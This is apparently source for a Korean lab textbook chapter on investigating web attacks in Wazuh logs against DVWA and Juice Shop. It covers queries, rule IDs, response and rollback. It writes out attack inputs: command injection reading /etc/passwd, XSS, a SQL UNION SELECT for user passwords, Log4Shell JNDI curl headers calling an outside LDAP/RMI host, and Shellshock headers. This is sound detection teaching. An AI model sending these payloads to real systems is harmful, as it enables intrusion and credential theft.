 bi('B07-09-command-dvwa','http://dvwa.ccc.com/vulnerabilities/exec/?ip=127.0.0.1%7Ccat%20/etc/passwd'),
 p('cat /etc/passwd는 표준입력 대신 지정 파일을 읽는다. 파이프로 ping 출력이 연결되더라도 cat은 계정 파일을 출력하려는 명령이다. 이 GET 요청의 기존 결과는 403이다.'),
 p('DVWA Low 처리기는 POST에 Submit이 있어야 명령을 구성한다. 따라서 주소창의 GET과 앞의 폼 POST는 동작이 다르다. 슬라이드의 인증 없는 curl POST는 302였으며, 로그인한 브라우저 제출 결과로 바꾸어 설명할 수 없다.'))

page('7.5  접속 기록의 필드 읽기',
 sc('exec-rule','DVWA 요청의 웹 오류 경보'),
 sc('exec-status','접속 기록의 GET과 403'),
 sc('exec-url','ip 쿼리에 포함된 파이프와 파일 경로'),
 p('rule.id는 31101이다. data.protocol의 GET은 HTTP 메서드, data.id의 403은 응답 코드이다. data.url의 %7Ccat%20/etc/passwd가 입력한 기호·명령·대상 파일에 해당한다.'),
 q('agent.name: "web"\nAND data.url: (*vulnerabilities/exec/* OR *track-order*)','두 요청 경로를 먼저 찾는다. 특정 공격 문자열보다 경로 조건을 넓게 사용해 정상 요청·POST도 함께 비교한다.','정상 입력과 공격 입력의 메서드·상태·시각을 기록한다. POST 본문은 URL에서 찾지 않는다.'))

page('7.5  명령 문자열과 WAF 검색',
 q('agent.name: "web" AND data.url:\n(*%3Bid* OR *;id* OR *%7Ccat* OR *cat%20*\n OR *whoami* OR *%24%28*)','슬라이드의 URL 검색 중 명령·인코딩 후보를 묶었다. %24%28은 $(이다. 기호 하나보다 명령명과 함께 확인한다.','이 식은 후보를 고르는 식이다. 인코딩이 다르거나 POST 본문으로 전달된 값은 별도로 조사한다.'),
 q('agent.name: "web"\nAND location: "/var/log/apache2/modsec_audit.log"','감사 로그를 수집한 이벤트를 찾는다. 시간을 해당 POST 요청 전후로 좁히고 원문을 펼친다.','요청 줄·출발지·시각과 transaction 식별자를 연결한다. data.audit_data.messages와 full_log에서 탐지 메시지를 읽는다.','wazuh-archives-*'),
 p('CRS는 WAF의 공격 검사 규칙 모음이다. 명령 삽입은 Remote Command Execution 메시지와 932 계열 등 관련 규칙이 조사 단서가 된다. WAF 규칙 번호와 Wazuh rule.id는 서로 다른 체계이다.'),
 p('감사 로그의 요청 본문은 기록 정책·감사 섹션에 따라 저장 여부가 다르다. 본문이 없으면 Network의 Form Data와 애플리케이션 기록을 대조한다. 경보 인덱스에 없는 WAF 이벤트는 아카이브에서 조사하되 아카이브의 수집 범위도 확인한다.'))

page('7.5  처리 코드와 대응',
 p('처리 위치는 kt66-dvwa의 /var/www/html/vulnerabilities/exec/source/low.php이다. 입력은 $_REQUEST의 ip에서 읽지만 처리 시작 조건은 $_POST의 Submit이다. Linux 분기에서는 ping -c 4 뒤에 입력을 붙인다. -c 4는 ping 요청 횟수이다.'),
 p('shell_exec는 셸 명령을 실행해 출력을 반환하는 PHP 함수이다. 응답의 <pre> 영역에 그 출력이 들어간다. 접속 로그의 응답 바이트 수가 커졌다는 사실만으로 출력 내용을 알 수는 없다.'),
 tab(['관찰','다음 확인'],[['GET · 403','WAF 메시지와 처리 결과, 실제 애플리케이션 전달 여부.'],['POST · 302','Location과 로그인 세션, Submit·ip 전송 여부.'],['POST · 200','응답 본문의 uid·gid 등 출력과 서버 실행 기록.'],['명령 문자열만 존재','입력 처리 코드와 웹 프로세스의 하위 프로세스.']],[39,88]),
 p('대응할 때는 먼저 요청·응답·프로세스 자료를 보존하고 노출 기능의 접근을 제한한다. 코드에서는 셸 호출 대신 해당 작업을 수행하는 라이브러리를 우선 사용한다. 명령 실행이 필요하면 인자 분리와 허용값 검사를 적용하고 실행 계정의 권한을 줄인다. [9]'),
 p('출발지 차단만으로 입력 처리 취약점이 사라지지는 않는다. 수정 후 정상 기능과 같은 공격 입력을 각각 확인해야 한다. 이 사례의 실습 종료 기준은 브라우저 입력과 DVWA 단계의 원상복구이다.'))

page('7.6  HTTP 200과 공격 결과',
 p('조사 대상은 공격 형태의 URL에 200이 반환된 요청이다. HTTP 200은 서버가 요청을 성공적으로 처리했다는 응답이다. 스크립트 실행·DB 자료 노출·명령 실행 중 무엇이 일어났는지는 응답 본문과 애플리케이션 기록에서 확인한다.'),
 fig('response','도식 7-7. HTTP 응답과 실제 처리 결과의 대조'),
 p('Wazuh 4.10의 31106은 SQL 인젝션·일반 웹 공격·XSS 계열 상위 규칙과 200 응답이 함께 일치할 때 적용된다. 설명의 success는 그 조건과 함께 읽는다. [8]'),
 p('선행 조건은 Juice Shop 정상 접속과 사이트의 WAF 모드 확인이다. 슬라이드의 Juice는 DetectionOnly이다. 이 모드는 검사 결과를 남기면서 요청을 통과시킨다. 탐지 전용 모드라도 애플리케이션이 오류를 내면 500이 반환될 수 있다.'),
 p('성공 기준은 서로 다른 두 입력의 응답을 비교하고, 200 경보가 입증하는 범위를 설명하는 것이다. 200을 만들기 위해 전체 WAF를 끄지 않는다.'))

page('7.6  XSS 형태의 URL 입력',
 p('Windows 브라우저의 User-Agent가 기본값인지 확인한다. Network를 연 뒤 아래 URL을 한 번 요청한다. %3C와 %3E는 <와 >이며 스크립트 태그 안의 alert(1)은 알림 창을 표시하려는 JavaScript이다.'),
 bi('B07-10-xss','http://juice.ccc.com/?q=%3Cscript%3Ealert(1)%3C/script%3E'),
 p('문서 요청의 Status Code와 Response를 읽고 알림 창이 나타났는지도 별도로 적는다. URL의 문자열이 응답 HTML에서 실행되는 위치에 들어가야 XSS가 성립한다. 주소창에 script라는 글자가 있다는 사실만으로 실행되는 것은 아니다.'),
 sc('ok-rule','의심 URL의 규칙 31106'),
 sc('ok-status','출발지 주소와 HTTP 200'),
 sc('ok-url','q 값에 담긴 script 태그 형태의 문자열'),
 p('기존 경보에서 확인한 값은 .202, 200, 31106이다. 화면에는 브라우저의 스크립트 실행 결과가 없어 XSS 성공은 추가 증거가 필요하다.'))

page('7.6  UNION 입력과 500 응답',
 p('같은 슬라이드의 다른 공격은 상품 검색 API의 SQL 인젝션이다. API는 프로그램이 데이터를 요청하는 인터페이스이다. 다음 URL은 q 값의 작은따옴표와 닫는 괄호로 기존 SQL 구문을 끝내고 UNION SELECT를 이어 붙이려는 입력이다.'),
 bi('B07-11-union','http://juice.ccc.com/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--'),
 p('UNION은 조회 결과를 합치고 SELECT 뒤에는 가져올 열을 적는다. id·email·password와 숫자 4~9로 아홉 개 열을 구성한다. FROM Users는 조회 대상, 두 하이픈(--)은 뒤 SQL을 주석으로 처리하려는 구문이다. 실제 열 수·자료형·원래 SQL 구조가 맞아야 조회가 성립한다.'),
 sc('union-response','UNION SELECT 요청의 HTTP 500',70),
 p('이 입력의 슬라이드 응답은 500이다. 사용자 표가 반환됐다는 본문 증거는 제시돼 있지 않다. 자료 노출 여부는 응답 본문·애플리케이션·DB 기록을 확보한 뒤 판단한다.'),
 p('브라우저에서는 URL을 한 번 요청하고 상태·본문을 기록한다. 같은 슬라이드의 XSS 형태 요청은 200이었다. “WAF를 통과했다”와 “목표한 SQL 처리가 성공했다”를 각각 적는다.'))

page('7.6  200 경보의 우선 조사',
 q('agent.name: "web"\nAND (rule.id: "31106"\n OR (rule.groups: "attack" AND data.id: "200"))','31106 또는 attack 그룹과 200을 함께 가진 문서를 찾는다. 그룹·상태 조건은 괄호로 묶는다.','출발지·URL·시각을 적고 같은 출발지의 앞뒤 요청으로 범위를 넓힌다.'),
 p('조사 우선순위는 응답 코드뿐 아니라 노출 기능, 반환 데이터, 서버 변화, 자산의 중요도를 함께 보고 정한다. WAF가 탐지한 요청이 통과했으면 해당 기능의 취약점과 실제 결과를 우선 확인한다.'),
 p('대응에서는 요청·응답과 관련 파일·프로세스·DB 기록을 보존하고 영향을 받은 기능의 접근을 제한한다. XSS 입력은 출력 위치와 인코딩, SQL 입력은 쿼리 구성과 인자 바인딩을 검토한다. 5장에서 다룬 입력과 결과의 연결을 적용한다.'),
 h('실패 시 확인과 원상복구'),
 p('403이 나오면 사이트 이름과 WAF 감사 기록을 확인한다. 200인데 경보가 없으면 URL 원문과 실제 규칙을 확인하고 아카이브를 조회한다. 500이면 오류 원인을 조사하며 200 경보가 나올 것으로 기대하지 않는다.'),
 p('브라우저를 정상 사이트 주소로 돌리고 User-Agent·Network 설정을 확인한다. 보관할 요청 기록을 먼저 남긴 뒤 실습 탭을 닫는다. 서버 데이터가 바뀌었는지는 응답·DB 기록에 근거해 확인한다.'),
 spot('05','review','요청과 처리 결과의 증거 대조'))

page('7.7  서버 오류와 반복 요청',
 p('조사 대상은 상품 검색 경로의 5xx 응답이다. 5xx는 서버가 요청을 처리하다 발생한 오류 계열이다. 공격 입력 외에도 DB 연결 실패, 잘못된 배포, 자원 부족이 원인이 될 수 있다.'),
 tab(['상태','의미'],[['500 Internal Server Error','서버 내부의 예상하지 못한 오류.'],['501 Not Implemented','요청 처리에 필요한 기능을 지원하지 않음.'],['503 Service Unavailable','과부하·점검 등으로 일시적 처리 불가.']],[62,65]),
 fig('errors','도식 7-8. 동일한 시간 구간의 오류 분포 비교'),
 p('퍼징은 입력을 바꾸며 비정상 동작을 찾는 시험이다. 슬라이드의 실습은 작은따옴표와 숫자를 바꾸어 요청한다. 서비스 거부 공격은 서비스 가용성을 해치는 공격이며, 20회 오류 관찰을 곧바로 서비스 거부 성공으로 부르지는 않는다.'),
 p('선행 조건은 Juice의 정상 상품 검색 응답이다. 성공 기준은 실제 요청 수·5xx 응답 수·Wazuh 문서 수를 구분하고 같은 길이의 구간끼리 비교하는 것이다.'))

page('7.7  오류 입력과 20회 관찰',
 p('Windows 브라우저에서 http://juice.ccc.com/rest/products/search?q=apple을 열어 정상 응답을 기록한다. Network의 Preserve log를 켜고 다음 주소를 한 번 요청한다. %27은 작은따옴표이며 뒤의 1은 변화시킬 숫자이다.'),
 bi('B07-12-error','http://juice.ccc.com/rest/products/search?q=%271'),
 p('첫 응답이 500인지 확인하고 본문을 읽는다. 이후 끝 숫자를 2, 3처럼 하나씩 바꾸어 최대 20까지 요청한다. 10은 q=%2710, 20은 q=%2720이다. 매 요청의 시각·상태를 적고 응답이 지연되거나 정상 접속이 끊기면 관찰을 멈춘다.'),
 sc('error-series-a','반복 요청의 첫 10개 HTTP 500 응답',110),
 sc('error-series-b','반복 요청의 뒤 10개 HTTP 500 응답',110),
 p('슬라이드의 터미널 출력에는 500이 20개 있다. 이는 요청 도구가 받은 상태 목록이다. Wazuh 결과 화면의 한 건과 같은 수치로 취급하지 않는다. 원본의 반복문과 구문 해설은 7.9에 있다.'),
 h('원상복구'),
 p('반복 요청을 끝내고 정상 상품 검색 주소로 돌아간다. 처음의 정상 응답과 비교한다. 응답이 계속 실패하면 요청을 더 보내지 말고 앱·DB·자원 상태를 확인한다. 수집된 로그는 조사 기록으로 남긴다.'))

page('7.7  SQL 인젝션 경보의 500',
 sc('error-rule','500 응답 요청의 SQL 인젝션 규칙'),
 sc('error-status','접속 기록의 HTTP 500',65),
 sc('error-url','상품 검색 URL의 UNION SELECT 구문'),
 p('결과 화면의 rule.id는 31103이다. URL에는 UNION·SELECT·FROM 형태가 있고 data.id는 500이다. 7.6에서 읽은 UNION 요청과 연결되는 기록이며 반복문 전체의 결과 표가 아니다.'),
 p('접속 로그의 HTTP 상태와 Wazuh 규칙은 서로 다른 항목이다. 500 응답도 요청 문자열에 따라 SQL 인젝션 규칙으로 분류될 수 있다. 500 한 건을 찾았다는 사실만으로 반복 오류 규칙이 발생했다고 판단하지 않는다.'),
 q('agent.name: "web" AND data.id: 5*','문자열로 저장된 HTTP 상태에서 5로 시작하는 값을 찾는다. rule.id와 독립적으로 상태를 검색한다.','data.url·data.srcip·rule.id 열을 추가하고 시간 분포를 확인한다.'))

page('7.7  시간 분포와 오류 비율',
 p('① Discover에서 조사 구간을 지정하고 5xx 검색 결과의 시간 막대를 읽는다. 기록이 모인 구간을 선택해 URL과 출발지의 분포를 확인한다.'),
 p('② 직전의 같은 길이 구간과 비교한다. 동일 서비스·로그 경로·수집 범위를 사용한다. 한두 출발지에 집중돼도 정상 시험이나 장애일 수 있으므로 요청 내용과 앱 오류를 함께 조사한다.'),
 p('③ 전체 요청 대비 오류 비율이 필요하면 동일 기간의 원본 access 로그나 빠짐없이 수집된 아카이브를 사용한다. 경보 인덱스의 검색 건수는 전체 HTTP 요청 수가 아니다. 같은 요청이 access와 WAF에 각각 남으면 문서가 중복될 수도 있다.'),
 tab(['계산 예시 · 1분','직전 구간','조사 구간'],[['전체 접속 로그 수','200','400'],['5xx 접속 로그 수','2','40'],['5xx 비율','1%','10%']],[61,33,33]),
 p('비율은 5xx 접속 로그 수를 전체 접속 로그 수로 나눈 뒤 100을 곱한다. 위 표는 계산 예시이며 슬라이드의 측정값이 아니다. 같은 access 로그 한 종류를 분자·분모에 사용한다.'),
 p('시각은 원문의 +0900과 Discover 표시 시간대를 맞춘다. 날짜·시간대·서비스·기간·검색식을 기록해야 다른 사람이 같은 범위를 다시 조사할 수 있다.'))

page('7.7  반복 오류 규칙과 대응',
 tab(['응답','개별 규칙','반복 규칙'],[['501','31121','31161'],['500','31122','31162'],['503','31123','31163']],[35,46,46]),
 q('agent.name: "web"\nAND rule.id: (31161 OR 31162 OR 31163)','응답별 반복 오류 경보를 검색한다. 각 규칙은 해당 개별 규칙과 같은 출발지 조건을 연결한다.','5xx 요청과 반복 경보의 시각·출발지·상위 규칙을 대조한다.'),
 p('Wazuh 4.10 정의는 frequency="14", timeframe="120"이다. timeframe은 비교 구간의 초 단위 값이며 frequency는 규칙의 발생 조건 설정이다. 이를 전체 요청 수나 최종 경보 건수로 그대로 환산하지 않는다. [8]'),
 p('31152·31153·31154는 SQL 인젝션·일반 웹 공격·XSS의 반복 탐지 규칙이다. 5xx 반복 규칙과 구분한다. 특히 31103으로 분류된 500 기록이 31122 기반 반복 조건을 그대로 충족한다고 가정하지 않는다.'),
 p('대응은 오류와 서비스 영향을 함께 확인하는 데서 시작한다. 공격 입력이 집중되면 해당 기능·출발지에 제한을 검토하고, 앱·DB 오류와 자원 상태를 보존한다. 배포·연결 장애라면 원인 변경을 되돌린 뒤 정상 검색과 오류율 회복을 확인한다.'))

page('7.8  로그와 설정의 원본 위치',
 p('응답과 Wazuh 결과가 예상과 다르면 원본을 읽어 전달 경로를 확인한다. 다음 명령은 설정을 조회하는 절차이다. 파일을 고치기 전에 현재 설정과 결과부터 기록한다.'),
 c('docker exec -it kt66-web /bin/bash','접속 로그와 WAF 설정을 읽을 web 컨테이너로 들어간다.','다음 조회는 kt66-web 안에서 수행한다.','kt66 VM · 호스트 터미널'),
 c("grep -n -F 'book07-shell.php' \\\n  /var/log/apache2/landing_access.log",'파일명 그대로 검색한다. -n은 줄 번호, -F는 문자 검색이다. 줄 끝의 역슬래시(\\)는 다음 줄을 한 명령으로 연결하며 그 뒤에 공백을 넣지 않는다.','시각·출발지·요청 줄·상태를 읽는다. 새 파일명을 정했다면 검색값도 바꾼다.'),
 c("grep -n -E 'ServerName|DocumentRoot|ProxyPass|SecRuleEngine' \\\n  /etc/apache2/sites-enabled/*.conf",' -E는 확장 정규표현식을 사용한다. 작은따옴표 안의 파이프(|)는 네 이름 중 하나를 고르는 OR이다. 셸에서 명령 사이의 |로 출력을 전달하는 용법과 다르다. *.conf는 셸이 해당 이름의 파일 목록으로 펼친다.','사이트 이름·문서 루트·프록시 대상·WAF 모드를 연결한다. 이 긴 식은 예제 파일에서 복사할 수 있다.'),
 p('DocumentRoot는 파일을 제공하는 루트이며 ProxyPass는 다른 서비스로 요청을 전달한다. SecRuleEngine DetectionOnly는 탐지 전용이고 On은 규칙에 따른 차단을 적용한다.'))

page('7.8  감사 기록과 앱 처리기 조회',
 c('tail -n 5 /var/log/apache2/modsec_audit.log','WAF 감사 로그 끝의 다섯 줄을 읽는다. JSON 한 줄이 길 수 있으므로 터미널에서 줄 전체를 확인한다.','요청·응답·탐지 메시지를 같은 트랜잭션 안에서 대조한다. 최근 요청이 아니면 Discover의 시간 조건으로 찾는다.'),
 c('exit','web 컨테이너 셸을 닫는다.','kt66 호스트로 돌아간다.'),
 c('docker exec -it kt66-dvwa /bin/bash','DVWA 처리 코드를 읽을 컨테이너로 들어간다.','웹 프록시가 아닌 DVWA 안의 셸인지 확인한다.','kt66 VM · 호스트 터미널'),
 c('cat /var/www/html/vulnerabilities/exec/source/low.php','PHP 처리 코드를 출력한다.','POST의 Submit 조건, ip 입력, shell_exec와 ping 조합을 확인한다. 앞서 전송한 GET·POST와 비교한다.','kt66-dvwa · 컨테이너 셸'),
 c('exit','DVWA 컨테이너 셸을 닫는다.','kt66 호스트로 돌아간다.','kt66-dvwa · 컨테이너 셸'))

page('7.8  Manager의 규칙 정의 조회',
 c('docker exec -it kt66-siem /bin/bash','Wazuh Manager가 있는 컨테이너로 들어간다.','웹 로그 파일과 탐지 규칙 파일의 위치를 구분한다.','kt66 VM · 호스트 터미널'),
 c('grep -n -A 16 -F \'id="31106"\' \\\n  /var/ossec/ruleset/rules/0245-web_rules.xml','grep의 -A 16은 일치한 줄과 그 뒤 16줄을 출력한다. -n은 줄 번호, -F는 문자 그대로 검색한다. 작은따옴표는 큰따옴표를 포함한 검색값을 그대로 전달한다.','<rule>부터 </rule>까지 읽어 if_sid와 id 조건을 확인한다. 검색값의 31106을 31108·31120·31122·31162·31166·31168로 하나씩 바꾸어 같은 명령을 실행한다.','kt66-siem · 컨테이너 셸'),
 p('if_sid는 같은 이벤트의 상위 규칙, if_matched_sid는 이전 이벤트의 반복 비교 조건이다. same_source_ip는 같은 출발지, timeframe은 비교 시간이다.'),
 p('<id>^200</id>는 웹 응답 코드인 data.id를 검사한다. id="31106"은 rule.id에 나타나는 규칙 번호이다. 캐럿(^)은 값의 시작, ^2|^3의 파이프는 OR로 2·3으로 시작하는 상태를 고른다. 31120의 ^50은 500~509 형태로, 5xx 전체보다 좁다.'),
 c('exit','Manager 컨테이너 셸을 닫는다.','호스트로 돌아간다. 규칙을 수정하지 않았으므로 재시작할 작업은 없다.','kt66-siem · 컨테이너 셸'))

page('7.9  다른 방법으로 요청 보내기',
 p('curl은 터미널에서 HTTP 요청을 보내 응답을 읽는 도구이다. 브라우저 입력을 헤더·URL 명령으로 표현하거나 브라우저에서 지정하기 어려운 Referer·X-Api-Version을 보낼 때 사용한다. 실행 위치는 별도 공격자 VM이다.'),
 c('curl --version','--version은 설치 버전과 지원 기능을 표시한다. 기본 구문은 curl 옵션 URL이다.','설치돼 있으면 버전이 출력된다. 없으면 1.12의 공격자 도구 준비를 먼저 마친다.','공격자 VM · 터미널'),
 p('공격자 VM의 /etc/hosts에도 7.1과 같은 두 사이트가 kt66 주소로 등록돼 있어야 한다. 5장의 이름 등록 방법으로 기존 항목을 확인한 뒤 편집하고 정상 페이지 응답으로 확인한다.'),
 tab(['구문','동작'],[['-i','응답 헤더와 본문을 함께 출력한다.'],['--max-time 15','전체 요청 대기 시간을 15초로 제한한다.'],['-A 값','User-Agent 헤더를 지정한다.'],['-H 이름:값','지정한 헤더를 보낸다.'],['작은따옴표(\')','공백·$·중괄호 등을 셸 해석 없이 전달한다.'],['줄 끝 역슬래시(\\)','다음 줄까지 같은 명령으로 연결한다.']],[39,88]),
 p('curl은 브라우저의 로그인 쿠키를 자동으로 공유하지 않는다. 아래 요청의 302는 Location과 함께 확인한다. -i로 본문을 남겨 상태만 출력한 슬라이드 명령보다 처리 결과를 더 확인할 수 있게 한다.'))

page('7.9  JNDI 헤더와 URL',
 p('curl의 --get은 데이터를 URL 쿼리로 전송하고 --data-urlencode는 값을 URL 인코딩한다. 직접 % 문자를 조합하는 대신 q의 평문 값을 전달한다. 브라우저 예제와 마찬가지로 헤더·쿼리의 조회 주소를 맞춘다.'),
 c("curl -i --max-time 15 --get \\\n  -A '${jndi:ldap://192.168.0.108:1389/a}' \\\n  --data-urlencode \\\n  'q=${jndi:ldap://192.168.0.108:1389/a}' \\\n  http://dvwa.ccc.com/",'작은따옴표는 ${…}를 공격자 셸이 먼저 치환하는 것을 막는다. 인코딩된 q는 URL에, -A의 값은 User-Agent에 실린다.','상태·본문과 JNDI 검색 결과를 연결한다. 조회 서버의 실제 동작은 별도의 통신·실행 기록이 필요하다.','공격자 VM · 터미널'),
 p('슬라이드의 첫 명령은 헤더와 q의 목적지 표기가 달랐다. 본문에서는 모두 1389/a로 맞췄다. 주소를 바꾼 요청은 기존 화면과 다른 새 요청이므로 자신의 시각과 주소로 조회한다.'),
 p('이 명령은 LDAP 서버나 Java 실행 환경을 만들지 않는다. 외부 조회를 받은 서버의 응답·클래스 제공·명령 실행 과정은 원본 자료에 없으므로 요청 관찰의 결과와 구분한다.'))

page('7.9  JNDI 변형 헤더',
 c("curl -i --max-time 15 \\\n  -H 'X-Api-Version: ${${lower:j}ndi:ldap://192.168.0.108:1389/b}' \\\n  -A '${jndi:rmi://192.168.0.108:1099/c}' \\\n  http://dvwa.ccc.com/",'X-Api-Version에는 LDAP 변형, User-Agent에는 RMI 조회 형태를 넣는다. 바깥 작은따옴표는 두 표현식을 셸에서 실행하지 않고 헤더 문자로 전달한다.','슬라이드 변형의 응답은 302였다. 이 명령의 상태·Location·본문을 읽고 수집된 헤더를 각각 확인한다.','공격자 VM · 터미널'),
 p('원본 변형 명령에는 바깥 조회 표현식의 닫는 중괄호와 LDAP 포트 표기가 불완전했다. 위 명령은 ${${lower:j}ndi:…}의 구조를 완성한 입력이다. 기존 302를 수정된 구문의 실행 검증 결과로 사용하지 않는다.'),
 p('X-Api-Version이 access 로그에 없다면 WAF 감사 기록을 확인한다. User-Agent의 jndi만 검색에 걸렸다고 X-Api-Version까지 수집됐다고 판단하지 않는다.'),
 h('원상복구'),
 p('curl의 -H·-A 값은 해당 요청에만 적용된다. 다음 명령에 옵션을 넣지 않으면 그 헤더 값은 재사용되지 않는다. 임시로 바꾼 hosts 항목이 있으면 시작 전 값으로 돌리고 정상 이름 해석을 확인한다.'))

page('7.9  Shellshock의 두 헤더',
 c("curl -i --max-time 15 \\\n  -A '() { :; }; /bin/bash -c \"id\"' \\\n  http://juice.ccc.com/cgi-bin/test.cgi",'User-Agent에 함수 형태와 id 실행 시도를 넣는다. 큰따옴표는 바깥 작은따옴표 안에 있으므로 헤더에 그대로 전달된다.','슬라이드의 200과 응답 본문을 구분해 읽는다. Shellshock 규칙과 같은 요청의 원문을 대조한다.','공격자 VM · 터미널'),
 c("curl -i --max-time 15 \\\n  -H 'Referer: () { :; }; /bin/bash -c \"cat /etc/passwd\"' \\\n  http://dvwa.ccc.com/cgi-bin/status",'Referer는 요청이 시작된 페이지를 알리는 헤더이다. -H로 그 값에 함수 형태와 파일 읽기 시도를 넣는다. 콜론은 헤더 이름과 값을 나눈다.','슬라이드의 이 요청은 403이었다. 원문의 Referer 위치와 상태를 함께 확인한다.','공격자 VM · 터미널'),
 p('두 요청은 서로 다른 사이트와 헤더를 쓴다. 어느 요소가 응답 차이를 만들었는지는 WAF·라우팅·CGI 설정을 확인해 판단한다. 요청자 헤더만으로 서버의 Bash 취약 여부를 확정하지 않는다.'))

page('7.9  POST 본문과 인증 상태',
 p('curl의 --data는 폼 데이터를 요청 본문에 넣고 기본적으로 POST를 선택한다. 아래 본문의 앰퍼샌드(&)는 ip와 Submit 두 필드를 나눈다. 작은따옴표로 감싸므로 셸의 백그라운드 실행 기호로 처리되지 않는다.'),
 c("curl -i --max-time 15 \\\n  --data 'ip=127.0.0.1;id&Submit=Submit' \\\n  http://dvwa.ccc.com/vulnerabilities/exec/",'ip는 공격 입력, Submit은 DVWA 처리 시작 조건에 필요한 폼 필드이다. -X POST를 추가하지 않아도 --data가 POST를 선택한다.','인증 쿠키를 지정하지 않은 이 요청과 로그인한 브라우저 POST는 구분한다. 302이면 Location을 확인한다.','공격자 VM · 터미널'),
 p('슬라이드는 이 POST에 302를 기록했다. access 로그에는 POST와 경로가 남고 ip 값은 일반적으로 남지 않는다. 본문 탐지는 WAF 감사 기록의 저장 여부까지 확인해야 한다.'),
 p('실제 로그인 상태의 공격 입력은 7.5의 브라우저 폼으로 수행한다. 쿠키가 없는 요청에서 명령 출력이 없다는 결과를 입력 처리 코드가 안전하다는 근거로 쓰지 않는다.'),
 p('요청 후 서버 설정 변경을 가정하지 않는다. 브라우저 실습에서 바꾼 DVWA 단계와 User-Agent는 각 절의 원상복구 절차로 돌린다.'))

page('7.9  원본 반복문의 구문',
 p('숫자 1~20을 붙이는 원본 반복문에 요청 시간 제한을 더했다. 7.7의 브라우저 관찰을 마쳤다면 구문만 읽는다.'),
 c('for i in $(seq 1 20); do\n  curl -sS --max-time 15 -o /dev/null \\\n    -w "%{http_code} " \\\n    "http://juice.ccc.com/rest/products/search?q=%27$i"\ndone\nprintf "\\n"','seq는 1~20을 출력하고 $(…)는 그 출력을 반복 목록으로 쓴다. for는 각 숫자를 i에 넣어 do~done을 반복한다.','응답 수와 요청 수를 적는다. 000이면 HTTP 응답을 얻지 못한 원인을 오류 메시지에서 확인한다.','공격자 VM · 터미널'),
 p('큰따옴표 안의 $i는 현재 숫자로 치환된다. 세미콜론은 for 문장의 부분을 구분한다. -s는 진행 표시를 숨기고 -S는 실패 메시지를 표시한다. -o /dev/null은 응답 본문을 버리며 -w는 요청 후 정보를 출력한다.'),
 p('%{http_code}는 curl이 받은 응답 코드이다. 마지막 printf는 형식대로 문자열을 출력하는 명령이며 \\n은 줄바꿈이다. 본문이 필요한 조사는 -i를 사용한 단일 요청으로 먼저 확인한다.'),
 p('이 반복문은 최대 20회이며 --max-time은 요청 하나마다 적용된다. 중간에 멈출 때는 Ctrl+C를 누른다. 종료 후 정상 검색을 확인하고, 출력된 상태 수와 Wazuh 검색 건수를 따로 기록한다.'))

page('7.10  조사 결론과 대응 기록',
 tab(['사례','기존 자료로 확인한 사실','추가 확인'],[['웹셸','파일 추가 554, URL 요청 404','작성 주체·URL 매핑·실행 기록'],['Log4Shell','JNDI 형태 요청 403, 변형 요청 302','Java 구성·외부 조회·실행'],['Shellshock','헤더 구문과 200·403, 규칙 31168·31166','CGI·Bash·프로세스'],['명령 삽입','Juice GET 200, DVWA GET 403·POST 302','인증·입력 처리·명령 출력'],['의심 요청 200','XSS 형태 URL과 31106','응답 HTML·브라우저 실행'],['서버 오류','반복 출력 500 20개, 별도 31103·500 기록','동일 기간 원문 수·오류 원인']],[25,57,45]),
 p('조사 기록에는 관찰한 사실과 판단 근거를 먼저 적는다. 그다음 확보하지 못한 증거, 조치 대상, 정상화 확인 결과를 남긴다. 검색 건수·규칙 설명만으로 침투 성공을 확정하지 않는다.'),
 p('예: “web에서 shell.php 추가 경보와 해당 URL의 404 요청을 확인했다. 파일 내용·작성 경로를 조사하고, 서버 실행 여부는 프로세스 자료로 확인한다.”'))

page('7.10  원상복구와 확인 문제',
 p('실습 파일·빈 폴더 제거를 확인한다. User-Agent·DVWA Security·Network·hosts를 시작 전 상태로 돌리고 로그아웃한다. 로그와 조사 기록은 보존한다.'),
 p('복사용 입력과 조사 양식은 examples/chapter07에 있다. investigation.txt에 입력·응답·원문·판단·대응·원상복구를 기록한다.'),
 h('확인 문제'),
 p('① 웹 폴더에 shell.php가 추가됐고 규칙 554가 발생했다. 웹셸 실행을 판단하려면 무엇을 더 확인해야 하는가?'),
 p('② Shellshock 요청에 200과 규칙 31168이 있다. CGI와 Bash를 조사해야 하는 이유는 무엇인가?'),
 p('③ POST의 ip 값이 access 로그의 URL에 없다. 어느 자료와 수집 조건을 확인해야 하는가?'),
 p('④ 20번의 요청이 500을 반환했지만 검색 결과는 한 건이다. 먼저 어떤 범위를 맞춰야 하는가?'),
 h('해설'),
 p('① 파일 내용·작성 주체·URL 매핑과 응답·실행 기록을 확인한다. ② 규칙은 접속 로그 조건이며 CGI·취약한 Bash 실행을 직접 증명하지 않기 때문이다. ③ Form Data, WAF 감사 본문의 저장 여부, 아카이브 수집을 확인한다. ④ 요청 시각·사이트·출발지·로그 종류·기간·인덱스·규칙을 맞추고 원본 access 기록을 센다.'))

page('7장 참고 자료',
 p('실습 절차와 기존 결과 화면의 출처는 [1]의 실습 07~12이다. 규칙 해석은 Wazuh 4.10 정의와 대조한다. 공식 문서의 최신 수정 지침은 적용 시점에 해당 운영체제·제품 버전과 함께 확인한다.'),
 ref('[1] Module 01 Wazuh 위협탐지 DQL · 슬라이드 116~174','https://docs.google.com/presentation/d/1o0H_2DDHBp8p2HvlSnEPbx6-jdURYzew/edit'),
 ref('[2] Apache HTTP Server 2.4 · Log Files','https://httpd.apache.org/docs/2.4/logs.html'),
 ref('[3] Wazuh · File integrity monitoring','https://documentation.wazuh.com/current/user-manual/capabilities/file-integrity/index.html'))
page('7장 참고 자료 · 계속',
 ref('[4] Wazuh · Event logging','https://documentation.wazuh.com/current/user-manual/manager/event-logging.html'),
 ref('[5] OWASP · File Upload Cheat Sheet','https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html'),
 ref('[6] Apache Logging Services · Security','https://logging.apache.org/security.html'),
 ref('[7] Red Hat · Bash Code Injection Vulnerability','https://access.redhat.com/articles/1200223'))
page('7장 참고 자료 · 규칙과 입력 처리',
 ref('[8] Wazuh 4.10.0 · Web access rules','https://github.com/wazuh/wazuh/blob/v4.10.0/ruleset/rules/0245-web_rules.xml'),
 ref('[9] OWASP · OS Command Injection Defense Cheat Sheet','https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html'),
